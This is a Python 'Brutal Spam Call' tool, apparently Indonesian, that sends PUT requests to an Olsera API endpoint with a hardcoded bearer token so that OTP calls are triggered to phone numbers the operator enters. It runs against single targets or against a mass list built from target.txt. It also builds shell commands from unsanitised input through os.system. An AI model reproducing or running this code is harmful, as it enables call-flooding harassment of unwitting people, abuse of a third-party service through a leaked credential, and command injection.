#!/usr/bin/python2.7
# -*- coding: utf-8 -*-


import os,sys,time,requests,bs4,json
from requests import put,post,get
from colorama import Fore,init,Back

H="\033[1;92m" # Hijau
W="\033[1;97m" # Putih
Ab="\033[1;90m" # Abu Abu
Y="\033[1;93m" # Kuning
U="\033[1;95m" # Ungu
gktau="33[37;1m" # Entah
B="\033[1;96m" # Biru
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def tanya():
	arifa_ammar=input(W+"Restart Game"+B+"? "+W+"("+Y+"y"+W+"/"+Y+"n"+W+")"+Fore.RED+":"+H+" ")
	if arifa_ammar == "y":
		mulai()
	if arifa_ammar == "n":
		sys.exit()

def mass_setting():
        try:
              sett=input(W+"Input Target "+Fore.BLUE+"•"+Fore.RED+"⟩"+H+" ")
              os.system("echo '"+sett+"' > list1.txt")
              os.system("mv target.txt list2.txt")
              os.system("cat list1.txt list2.txt > target.txt")
              tambah=input(W+"["+Y+"•"+W+"] Tambahkan Target Lagi "+B+"("+W+"y"+Ab+"/"+Ab+"n"+B+")"+Fore.RED+":"+H+"")
              if tambah == "y" or tambah == "Y":
                  mass_setting()
              if tambah == "n" or tambah == "N":
                  massive()
              if tambah == "" or tambah == " ":
                  print ("Pilihan Salah Silakan Pilih Ulang.")
                  time.sleep(4)
                  mass_setting()
        except KeyboardInterrupt:
                sys.exit(W+"["+Fore.RED+"!"+W+"] Exited With Program"+Ab+".....")

def mass_start():
	try:
		s=requests.Session()
		arifa_luvv=open("target.txt","r").readlines()
		for line in arifa_luvv:
			ammar_ganteng=line.strip()
			head={'Host':'api-dash.olsera.co.id','content-length':'41','sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"','accept':'application/json, text/plain, */*','content-type':'application/json','authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYwYWExOGQxNDAxMmJjYTIzYzkwMGUzNDNlZDMwMzVjNjE0MTgxNTlmYjhjNjA4OTM2M2Y0ZDIzZDRjODljODJhZTA2ODFkYjk1NjkzODQ5In0.eyJhdWQiOiIyIiwianRpIjoiNjBhYTE4ZDE0MDEyYmNhMjNjOTAwZTM0M2VkMzAzNWM2MTQxODE1OWZiOGM2MDg5MzYzZjRkMjNkNGM4OWM4MmFlMDY4MWRiOTU2OTM4NDkiLCJpYXQiOjE2NjA1NzczMDgsIm5iZiI6MTY2MDU3NzMwOCwiZXhwIjoxNjYwNjYzNzA1LCJzdWIiOiIzODU5MTgiLCJzY29wZXMiOltdfQ.fPVn1hbJXgFnIr04713kKA3kUxUtnhfeHGU1A4vsDwq4hiU706d2KqtRmUIKA1_IFliT7wcfcZ4splKuurR159OiNEJnIp6-94wZw1x1qf_vVCIkU_wNCHX9qRnAEuDkI4L3RedHkhzv-EJ77zkdDzIojInA7OWXdkGP9YRY3CAlFxzenQPEiAw74etl5LUGeyyWL1Bmb3BLQUffile5hx7RraLXfCTfdnThOMxp26Z4GIwhIbo-oeN72JCRZpqTCOyItsyS35q1JIwVg7aa183ea6DHAlanaTrp6WEs1sKE8m9Ip0UJK5uwibuFN8DZqxQvvnfAalnDJfSF2hNDbAn_6RrAmh7HLrUiN8PJI0HQ2-OlY6nQDJjQQFyNSb5x1zzW2nzgvaN_oqY311uPYbJaOeyx8v0TL_9xVDBe1frNoFKkcIEeCBYnCiPeCNZanN3d-DMjeW97KY3ZQOC9vNeaxPzndreBetTYfTHFK7utjXp5pJVAPj14zdRYFzMzlqJp2oUB-T9-5Pm9FlGm7NsiDdEkCKkqMp7RB8iEsuOkoUfPsx0msP-ip1v415lSLN2EI2DIt4yaHNTfs-tPpDZshTTLPsaCygZ90QMXOi07UxVG9v6VtBVtdoIVlA9pzP_nQ-Rb-VXZbq1ytnkDO-wc-EO54d9EK67V3I3Zce4','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36','sec-ch-ua-platform':'Linux','origin':'https://www.olsera.com','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.olsera.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			data=json.dumps({"phone":ammar_ganteng,"use_otp_type":2})
			hai=s.put("https://api-dash.olsera.co.id/api/admin/v1/id/updateuser/385918",headers=head,data=data).text
			if "Update berhasil." in hai:
				print (W+"Successfully "+U+"Send Call To "+Y+ammar_ganteng)
				print ("")
			else:
				print (B+"Spam Has Reached Limit Please Try Again After 1 Hour")
				print ("")
	except requests.exceptions.ConnectionError:
		sys.exit(W+"Disconnected Network "+Y+"Connection"+W+". Please Try Again.")
	except FileNotFoundError:
                sys.exit(Fore.RED+"Error!!"+W+". File Not Valid "+Fore.RED+"!"+W+" ")

def banner():
	os.system("clear")
	time.sleep(3)
	print (Fore.RED+" ▄    ▄▄▄▄▄▄▄    ▄ "+U+"╔═╗"+W+"┌─┐┌─┐┌┬┐  "+U+"╔═╗"+W+"┌─┐┬  ┬")
	print (Fore.RED+"▀▀▄ ▄█████████▄ ▄▀▀"+U+"╚═╗"+W+"├─┘├─┤│││  "+U+"║  "+W+"├─┤│  │")
	print (Fore.RED+"    ██ ▀███▀ ██    "+U+"╚═╝"+W+"┴  ┴ ┴┴ ┴  "+U+"╚═╝"+W+"┴ ┴┴─┘┴─┘")
	print (Fore.RED+"  ▄ ▀████▀████▀ ▄    "+Y+"• "+W+"Creator "+Fore.RED+":"+H+" AmmarrBN")
	print (Fore.RED+"▀█    ██▀█▀██    █▀  "+Y+"• "+W+"Youtube "+Fore.RED+":"+H+" Ammar Executed")
	print ("\t\033[1;0m["+Back.WHITE+Fore.RED+"●"+Fore.YELLOW+" ●"+Fore.GREEN+" ●"+Fore.BLACK+" Brutal Spam Call "+Fore.GREEN+"●"+Fore.YELLOW+" ●"+Fore.RED+" ●\033[1;0m]")
	print ("")

def mulai():
	s=requests.Session()
	banner()
	print (Ab+"""   Note: This spam has a limit of 8x/2 hours.
Prefix Number with 8xx. Click CTRL+C or CTRL+Z to Stop.
""")
	print (W+"1"+Fore.RED+"."+W+"Single Mode\n2"+Fore.RED+"."+W+"Massive Mode\n3"+Fore.RED+"."+W+"Report "+Y+"Bug\n"+W+"4"+Y+"."+Fore.RED+"Exit\n")
	mr_alok=input(W+"["+B+"~"+W+"] Chose Menu "+Fore.RED+":"+H+" ")
	if mr_alok == "1" or mr_alok == "01":
		single_spam()
	elif mr_alok == "2" or mr_alok == "02":
		time.sleep(5)
		massive()
	elif mr_alok == "3" or mr_alok == "03":
		os.system("xdg-open https://instagram.com/ammarexecuted")
		print (Y+"Thx For Report Bug :)"+W)
		tanya()
	elif mr_alok == "4" or mr_alok == "04":
		sys.exit()
	elif mr_alok == "" or mr_alok == " ":
		print ("No Valid !")
		time.sleep(5)
		os.system("python call.py")

def massive():
	banner()
	print (W+"1"+Fore.RED+"."+W+"Start Massive\n2"+Fore.RED+"."+W+"Settings Target\n3"+Fore.RED+"."+W+"Remove Target \n4"+Fore.RED+"."+Y+"Back Tools\n")
	arifa_cantik=input(W+"["+B+"~"+W+"] Chose Menu "+Fore.RED+":"+H+" ")
	if arifa_cantik == "1":
		mass_start()
		tanya()
	if arifa_cantik == "2":
		mass_setting()
	if arifa_cantik == "3":
		os.system("rm list1.txt list2.txt target.txt")
		print (W+"Successfully Removed Target.")
		time.sleep(10)
		massive()
	if arifa_cantik == "4":
		mulai()

def single_spam():
	s=requests.Session()
	banner()
	print (Ab+"""	Note: This spam has a limit of 8x/2 hours. 
Prefix Number with 8xx. Click CTRL+C or CTRL+Z to Stop.""")
	nomor=input("\n"+Fore.RED+"»"+B+"⟩"+W+" Input Phone Number "+Fore.RED+":"+H+" ")
	head={'Host':'api-dash.olsera.co.id','content-length':'41','sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"','accept':'application/json, text/plain, */*','content-type':'application/json','authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYwYWExOGQxNDAxMmJjYTIzYzkwMGUzNDNlZDMwMzVjNjE0MTgxNTlmYjhjNjA4OTM2M2Y0ZDIzZDRjODljODJhZTA2ODFkYjk1NjkzODQ5In0.eyJhdWQiOiIyIiwianRpIjoiNjBhYTE4ZDE0MDEyYmNhMjNjOTAwZTM0M2VkMzAzNWM2MTQxODE1OWZiOGM2MDg5MzYzZjRkMjNkNGM4OWM4MmFlMDY4MWRiOTU2OTM4NDkiLCJpYXQiOjE2NjA1NzczMDgsIm5iZiI6MTY2MDU3NzMwOCwiZXhwIjoxNjYwNjYzNzA1LCJzdWIiOiIzODU5MTgiLCJzY29wZXMiOltdfQ.fPVn1hbJXgFnIr04713kKA3kUxUtnhfeHGU1A4vsDwq4hiU706d2KqtRmUIKA1_IFliT7wcfcZ4splKuurR159OiNEJnIp6-94wZw1x1qf_vVCIkU_wNCHX9qRnAEuDkI4L3RedHkhzv-EJ77zkdDzIojInA7OWXdkGP9YRY3CAlFxzenQPEiAw74etl5LUGeyyWL1Bmb3BLQUffile5hx7RraLXfCTfdnThOMxp26Z4GIwhIbo-oeN72JCRZpqTCOyItsyS35q1JIwVg7aa183ea6DHAlanaTrp6WEs1sKE8m9Ip0UJK5uwibuFN8DZqxQvvnfAalnDJfSF2hNDbAn_6RrAmh7HLrUiN8PJI0HQ2-OlY6nQDJjQQFyNSb5x1zzW2nzgvaN_oqY311uPYbJaOeyx8v0TL_9xVDBe1frNoFKkcIEeCBYnCiPeCNZanN3d-DMjeW97KY3ZQOC9vNeaxPzndreBetTYfTHFK7utjXp5pJVAPj14zdRYFzMzlqJp2oUB-T9-5Pm9FlGm7NsiDdEkCKkqMp7RB8iEsuOkoUfPsx0msP-ip1v415lSLN2EI2DIt4yaHNTfs-tPpDZshTTLPsaCygZ90QMXOi07UxVG9v6VtBVtdoIVlA9pzP_nQ-Rb-VXZbq1ytnkDO-wc-EO54d9EK67V3I3Zce4','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36','sec-ch-ua-platform':'Linux','origin':'https://www.olsera.com','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.olsera.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
	data=json.dumps({"phone":nomor,"use_otp_type":2})
	hai=s.put("https://api-dash.olsera.co.id/api/admin/v1/id/updateuser/385919",headers=head,data=data).text
	if "Update berhasil." in hai:
		print (W+"Successfully "+U+"Send Call To "+Y+nomor)
		tanya()
	else:
		print (B+"Spam Has Reached Limit Please Try Again After 1 Hour")
		tanya()


mulai()
